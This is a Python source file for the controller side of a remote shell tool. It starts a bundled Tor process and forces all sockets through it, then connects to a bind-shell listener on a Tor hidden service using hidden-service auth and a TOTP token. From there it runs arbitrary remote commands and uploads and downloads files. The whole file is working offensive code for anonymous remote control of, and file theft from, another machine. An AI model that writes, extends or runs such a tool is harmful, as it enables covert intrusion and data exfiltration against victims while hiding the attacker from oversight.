import os
import sys
import json
import socks
import socket
import base64
import stem.process
import stem.control


class ShellConnectionAnonymizer:

    def __init__(self, socks_port=9999):
        self._socks_port = socks_port
        self._data_dir = getattr(sys, "_MEIPASS", os.path.join(os.getcwd(), "bin"))
        self._tor_exe = os.path.join(self._data_dir, "tor.exe")
        self._tor_data_dir = os.path.join(self._data_dir, "tor_data")
        self._stem_controller_handle = None
        self._tor_process_handle = None
        self._orig_socket_handle = None
        self._orig_getaddrinfo = None

    def __enter__(self):
        self.anonymize()
        return self

    def __exit__(self, *args):
        self.deanonymize()

    @staticmethod
    def _getaddrinfo(*args):
        return [(socket.AF_INET, socket.SOCK_STREAM, 6, '', (args[0], args[1]))]

    def set_hidden_service_auth(self, hidden_service_address, authentication):
        print(f"[+] Setting auth token for {hidden_service_address} to {authentication}")
        self._stem_controller_handle.set_conf("HidServAuth", f"{hidden_service_address} {authentication}")
        print("[+] Authentication token registered.")

    def anonymize(self):
        print("[+] Spinning up anonymizer.")
        if not os.path.isfile(self._tor_exe):
            print("[!] Unable to launch anonymizer, TOR exe not found")
            return
        self._tor_process_handle = stem.process.launch_tor_with_config(
            config={
                "SocksPort": str(self._socks_port),
                "ControlPort": str(self._socks_port + 10),
                "DataDir": self._tor_data_dir,
                "FascistFirewall": "1"
            },
            tor_cmd=self._tor_exe,
            init_msg_handler=print
        )
        self._stem_controller_handle = stem.control.Controller.from_port("127.0.0.1", self._socks_port + 10)
        self._stem_controller_handle.authenticate()
        socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", self._socks_port)
        self._orig_socket_handle = socket.socket
        self._orig_getaddrinfo = socket.getaddrinfo
        socket.getaddrinfo = self._getaddrinfo
        socket.socket = socks.socksocket
        print("[+] Connection anonymization has been configured.")

    def deanonymize(self):
        if self._tor_process_handle is not None:
            print("[+] Tearing down anonymizer.")
            socket.getaddrinfo = self._orig_getaddrinfo
            socket.socket = self._orig_socket_handle
            self._tor_process_handle.kill()
            self._tor_process_handle = None
            print("[+] Connections will no longer be anonymized.")


class BoundShellConnector(object):

    def __init__(self, timeout=30):
        self.remote_cwd = ""
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._socket.settimeout(timeout)

    @staticmethod
    def _lsdir() -> str:
        contents = "\n".join(os.listdir(os.getcwd()))
        return contents

    @staticmethod
    def _lcd(command: str) -> str:
        if len(command.strip()) > 3:
            os.chdir(command[4:])
            return os.getcwd()
        else:
            return "Invalid syntax."

    def _handle_download(self, command: str):
        command = command.split()
        if len(command) > 2:
            file_dest = command[2]
        elif len(command) == 2:
            file_dest = command[1]
        else:
            return "Invalid syntax."
        if os.path.isfile(file_dest):
            confirmation = input("Destination file exists. Overwrite? [y/N] > ")
            if not confirmation or not confirmation.lower()[0] == "y":
                return "Aborting."
        self._socket.sendall(bytes(" ".join(command) + "\n", "utf-8"))
        file_contents = ""
        while True:
            content_part = str(self._socket.recv(1024), "utf-8")
            file_contents += content_part
            if content_part.endswith("\n"):
                break
        with open(file_dest, "wb") as outfile:
            outfile.write(base64.b64decode(json.loads(file_contents)["response"]))
        return f"File downloaded: {file_dest}"

    def _handle_upload(self, command: str):
        file_path = command.split()[1]
        if not os.path.isfile(file_path):
            return f"File not found: {file_path}"
        self._socket.sendall(bytes(command, "utf-8"))
        with open(file_path, "rb") as infile:
            file_contents = base64.b64encode(infile.read())
        response = str(self._socket.recv(1024), "utf-8")
        if response.startswith("Receiving"):
            self._socket.sendall(file_contents + b"\n")
        return self._get_response()

    def _execute_remote_command(self, command: str) -> dict:
        self._socket.sendall(bytes(command, "utf-8"))
        while True:
            try:
                response = self._get_response()
                if response["response"].endswith("\xff\xff"):
                    response["response"] = response["response"].replace("\xff", "")
                    return response
                elif response["response"].endswith("\xff\xfe"):
                    response["response"] = response["response"].replace("\xff\xfe", "")
                    sys.stdout.write(response["response"])
                    sys.stdout.flush()
                    stdin = input("> ") + "\n"
                    self._socket.sendall(bytes(stdin, "utf-8"))
                    continue
                else:
                    sys.stdout.write(response["response"])
                    sys.stdout.flush()
                    self._socket.sendall(b"\x01\x01")
            except KeyboardInterrupt:
                break

    def _get_response(self) -> dict:
        response = self._socket.recv(40960)
        try:
            return json.loads(response)
        except (ValueError, UnicodeDecodeError):
            return {
                "cwd": None,
                "response": str(response, "utf-8")
            }

    def connect(self, address: str, port: int, auth_code: str) -> bool:
        try:
            self._socket.connect((address, port))
            self._socket.sendall(bytes(auth_code, "utf-8"))
            response = self._get_response()
            if "Denied" not in response["response"]:
                self._socket.settimeout(None)
                return True
            self._socket.close()
        except socket.error as e:
            print(f"[!] Error connecting to host: {e}")
        return False

    def execute_command(self, command: str) -> str:
        if command.lower().strip() == "lsdir":
            response = self._lsdir()
        elif command.lower().strip() in ["cls", "clear"]:
            os.system("cls" if "nt" in os.name else "clear")
            response = ""
        elif command.lower().startswith("lcd"):
            response = self._lcd(command)
        elif command.lower().startswith("fup"):
            response = self._handle_upload(command)["response"]
        elif command.lower().startswith("fdown"):
            response = self._handle_download(command)
        elif command.lower().strip() == "lcwd":
            response = os.getcwd()
        elif command.lower().strip() == "exit":
            self._socket.sendall(b"exit\r\n")
            self._socket.close()
            return "exit"
        else:
            response_dict = self._execute_remote_command(command)
            if response_dict["cwd"]:
                self.remote_cwd = response_dict["cwd"]
            response = response_dict["response"]
        return response


if __name__ == "__main__":
    with ShellConnectionAnonymizer() as anonymizer:
        connector = BoundShellConnector()
        remote_addr = input("Hidden service address > ")
        remote_port = int(input("Hidden service port > "))
        hs_auth = input("Hidden service authorization > ")
        auth_token = input("TOTP token > ") + "\n"
        anonymizer.set_hidden_service_auth(remote_addr, hs_auth)
        print("[+] Connecting . . . ")
        connection_successful = connector.connect(remote_addr, remote_port, auth_token)
        if connection_successful:
            print("[+] Access Granted.")
            while True:
                command_str = input("{0}> ".format(connector.remote_cwd)) + "\n"
                response_text = connector.execute_command(command_str)
                if response_text == "exit":
                    break
                print(response_text)
        else:
            print("[!] Access Denied.")
        anonymizer.deanonymize()
    print("[+] Exiting . . .")
    sys.exit(0)
